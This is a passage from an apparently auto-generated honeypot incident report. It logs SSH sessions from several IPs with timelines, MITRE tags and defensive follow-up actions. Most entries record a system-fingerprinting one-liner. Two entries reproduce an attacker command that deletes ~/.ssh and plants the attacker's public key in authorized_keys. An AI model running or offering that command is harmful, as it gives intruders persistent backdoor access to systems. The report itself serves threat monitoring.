| `2026-07-05 11:38:08` | `cowrie.command.success` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:09` | `cowrie.log.closed` |
| `2026-07-05 11:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71a8835f1f4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:39 |
| **Last Seen** | 2026-07-05 11:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:39:32` | `cowrie.session.connect` |
| `2026-07-05 11:39:32` | `cowrie.client.version` |
| `2026-07-05 11:39:32` | `cowrie.client.kex` |
| `2026-07-05 11:39:35` | `cowrie.login.success` |
| `2026-07-05 11:39:36` | `cowrie.session.params` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.success` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:36` | `cowrie.command.input` |
| `2026-07-05 11:39:37` | `cowrie.log.closed` |
| `2026-07-05 11:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffd7a9eca75

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:41 |
| **Last Seen** | 2026-07-05 11:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:41:00` | `cowrie.session.connect` |
| `2026-07-05 11:41:01` | `cowrie.client.version` |
| `2026-07-05 11:41:01` | `cowrie.client.kex` |
| `2026-07-05 11:41:03` | `cowrie.login.success` |
| `2026-07-05 11:41:05` | `cowrie.session.params` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.success` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:05` | `cowrie.command.input` |
| `2026-07-05 11:41:06` | `cowrie.log.closed` |
| `2026-07-05 11:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b0a459b3b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:42 |
| **Last Seen** | 2026-07-05 11:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:42:30` | `cowrie.session.connect` |
| `2026-07-05 11:42:31` | `cowrie.client.version` |
| `2026-07-05 11:42:31` | `cowrie.client.kex` |
| `2026-07-05 11:42:34` | `cowrie.login.success` |
| `2026-07-05 11:42:36` | `cowrie.session.params` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.success` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.command.input` |
| `2026-07-05 11:42:36` | `cowrie.log.closed` |
| `2026-07-05 11:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a1ee86b99e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:44 |
| **Last Seen** | 2026-07-05 11:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:44:02` | `cowrie.session.connect` |
| `2026-07-05 11:44:03` | `cowrie.client.version` |
| `2026-07-05 11:44:03` | `cowrie.client.kex` |
| `2026-07-05 11:44:05` | `cowrie.login.success` |
| `2026-07-05 11:44:07` | `cowrie.session.params` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.success` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:07` | `cowrie.command.input` |
| `2026-07-05 11:44:08` | `cowrie.log.closed` |
| `2026-07-05 11:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a1e097abe8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:45 |
| **Last Seen** | 2026-07-05 11:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:45:34` | `cowrie.session.connect` |
| `2026-07-05 11:45:35` | `cowrie.client.version` |
| `2026-07-05 11:45:35` | `cowrie.client.kex` |
| `2026-07-05 11:45:38` | `cowrie.login.success` |
| `2026-07-05 11:45:40` | `cowrie.session.params` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.success` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:40` | `cowrie.command.input` |
| `2026-07-05 11:45:41` | `cowrie.log.closed` |
| `2026-07-05 11:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ba398adab6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:47 |
| **Last Seen** | 2026-07-05 11:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:47:05` | `cowrie.session.connect` |
| `2026-07-05 11:47:05` | `cowrie.client.version` |
| `2026-07-05 11:47:05` | `cowrie.client.kex` |
| `2026-07-05 11:47:09` | `cowrie.login.success` |
| `2026-07-05 11:47:12` | `cowrie.session.params` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.success` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.command.input` |
| `2026-07-05 11:47:12` | `cowrie.log.closed` |
| `2026-07-05 11:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d39dfe8dae3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 11:47 |
| **Last Seen** | 2026-07-05 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:47:29` | `cowrie.session.connect` |
| `2026-07-05 11:47:29` | `cowrie.client.version` |
| `2026-07-05 11:47:29` | `cowrie.client.kex` |
| `2026-07-05 11:47:30` | `cowrie.login.success` |
| `2026-07-05 11:47:31` | `cowrie.session.params` |
| `2026-07-05 11:47:31` | `cowrie.command.input` |
| `2026-07-05 11:47:31` | `cowrie.log.closed` |
| `2026-07-05 11:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ad202dc8b3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 11:48 |
| **Last Seen** | 2026-07-05 11:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:48:32` | `cowrie.session.connect` |
| `2026-07-05 11:48:33` | `cowrie.client.version` |
| `2026-07-05 11:48:33` | `cowrie.client.kex` |
| `2026-07-05 11:48:39` | `cowrie.login.success` |
| `2026-07-05 11:48:42` | `cowrie.session.params` |
| `2026-07-05 11:48:42` | `cowrie.command.input` |
| `2026-07-05 11:48:44` | `cowrie.log.closed` |
| `2026-07-05 11:48:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70600c52527d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:48 |
| **Last Seen** | 2026-07-05 11:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:48:34` | `cowrie.session.connect` |
| `2026-07-05 11:48:35` | `cowrie.client.version` |
| `2026-07-05 11:48:35` | `cowrie.client.kex` |
| `2026-07-05 11:48:38` | `cowrie.login.success` |
| `2026-07-05 11:48:40` | `cowrie.session.params` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.success` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:40` | `cowrie.command.input` |
| `2026-07-05 11:48:41` | `cowrie.log.closed` |
| `2026-07-05 11:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0486d6061d8b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:50 |
| **Last Seen** | 2026-07-05 11:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:50:03` | `cowrie.session.connect` |
| `2026-07-05 11:50:04` | `cowrie.client.version` |
| `2026-07-05 11:50:04` | `cowrie.client.kex` |
| `2026-07-05 11:50:07` | `cowrie.login.success` |
| `2026-07-05 11:50:09` | `cowrie.session.params` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.success` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.command.input` |
| `2026-07-05 11:50:09` | `cowrie.log.closed` |
| `2026-07-05 11:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de71ebbb052d

| Field | Detail |
|---|---|
| **Source IP** | `211.251.245[.]88` |
| **First Seen** | 2026-07-05 11:50 |
| **Last Seen** | 2026-07-05 11:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:50:10` | `cowrie.session.connect` |
| `2026-07-05 11:50:10` | `cowrie.client.version` |
| `2026-07-05 11:50:10` | `cowrie.client.kex` |
| `2026-07-05 11:50:10` | `cowrie.login.success` |
| `2026-07-05 11:50:11` | `cowrie.session.params` |
| `2026-07-05 11:50:11` | `cowrie.command.input` |
| `2026-07-05 11:50:11` | `cowrie.command.failed` |
| `2026-07-05 11:50:12` | `cowrie.log.closed` |
| `2026-07-05 11:50:13` | `cowrie.session.params` |
| `2026-07-05 11:50:13` | `cowrie.command.input` |
| `2026-07-05 11:50:13` | `cowrie.session.file_download` |
| `2026-07-05 11:50:13` | `cowrie.log.closed` |
| `2026-07-05 11:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.251.245[.]88` to AbuseIPDB if not already reported
- [ ] Block `211.251.245[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31b1aec6ce00

| Field | Detail |
|---|---|
| **Source IP** | `211.251.245[.]88` |
| **First Seen** | 2026-07-05 11:50 |
| **Last Seen** | 2026-07-05 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:50:13` | `cowrie.session.connect` |
| `2026-07-05 11:50:13` | `cowrie.client.version` |
| `2026-07-05 11:50:13` | `cowrie.client.kex` |
| `2026-07-05 11:50:14` | `cowrie.login.success` |
| `2026-07-05 11:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.251.245[.]88` to AbuseIPDB if not already reported
- [ ] Block `211.251.245[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5487397724ee

| Field | Detail |
|---|---|
| **Source IP** | `211.251.245[.]88` |
| **First Seen** | 2026-07-05 11:50 |
| **Last Seen** | 2026-07-05 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:50:14` | `cowrie.session.connect` |
| `2026-07-05 11:50:14` | `cowrie.client.version` |
| `2026-07-05 11:50:15` | `cowrie.client.kex` |
| `2026-07-05 11:50:15` | `cowrie.login.success` |
| `2026-07-05 11:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.251.245[.]88` to AbuseIPDB if not already reported
- [ ] Block `211.251.245[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-685421a62c33

| Field | Detail |
|---|---|
| **Source IP** | `189.204.230[.]91` |
| **First Seen** | 2026-07-05 11:51 |
| **Last Seen** | 2026-07-05 11:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:51:15` | `cowrie.session.connect` |
| `2026-07-05 11:51:15` | `cowrie.client.version` |
| `2026-07-05 11:51:15` | `cowrie.client.kex` |
| `2026-07-05 11:51:15` | `cowrie.login.success` |
| `2026-07-05 11:51:16` | `cowrie.session.params` |
| `2026-07-05 11:51:16` | `cowrie.command.input` |
| `2026-07-05 11:51:16` | `cowrie.command.failed` |
| `2026-07-05 11:51:16` | `cowrie.log.closed` |
| `2026-07-05 11:51:17` | `cowrie.session.params` |
| `2026-07-05 11:51:17` | `cowrie.command.input` |
| `2026-07-05 11:51:17` | `cowrie.session.file_download` |
| `2026-07-05 11:51:17` | `cowrie.log.closed` |
| `2026-07-05 11:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.204.230[.]91` to AbuseIPDB if not already reported
- [ ] Block `189.204.230[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c91bcf99c69

| Field | Detail |
|---|---|
| **Source IP** | `189.204.230[.]91` |
| **First Seen** | 2026-07-05 11:51 |
| **Last Seen** | 2026-07-05 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

